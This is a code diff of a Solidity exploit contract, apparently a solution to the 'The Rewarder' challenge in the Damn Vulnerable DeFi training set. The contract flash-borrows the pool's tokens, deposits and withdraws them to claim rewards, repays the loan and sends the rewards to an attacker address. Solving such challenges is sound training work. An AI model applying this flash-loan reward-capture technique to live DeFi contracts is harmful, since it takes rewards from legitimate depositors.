@@ -8,7 +8,7 @@ import {TheRewarderPool} from "dvd-v3/the-rewarder/TheRewarderPool.sol";
 import {DamnValuableToken} from "dvd-v3/DamnValuableToken.sol";
 import {RewardToken} from "dvd-v3/the-rewarder/RewardToken.sol";
 
-contract RewardSnatcherr {
+contract Snatcher {
     FlashLoanerPool public fl;
     TheRewarderPool public trp;
     RewardToken public rt;
@@ -26,7 +26,7 @@ contract RewardSnatcherr {
         rt = trp.rewardToken();
     }
 
-    function initiate() external {
+    function snatch() external {
         uint256 maxLoan = dvt.balanceOf(address(fl));
         fl.flashLoan(maxLoan);
     }
@@ -36,13 +36,11 @@ contract RewardSnatcherr {
         // receive rewardtokens
         // withdraw from the rewarder pool
         // transfer back to flashloan
+        // transfer rewards to our account
         dvt.approve(address(trp), amount);
         trp.deposit(amount);
         trp.withdraw(amount);
         SafeTransferLib.safeTransfer(address(dvt), address(fl), amount);
-    }
-
-    function getFunds() external {
         uint256 rewards = rt.balanceOf(address(this));
         SafeTransferLib.safeTransfer(address(rt), attacker, rewards);
     }
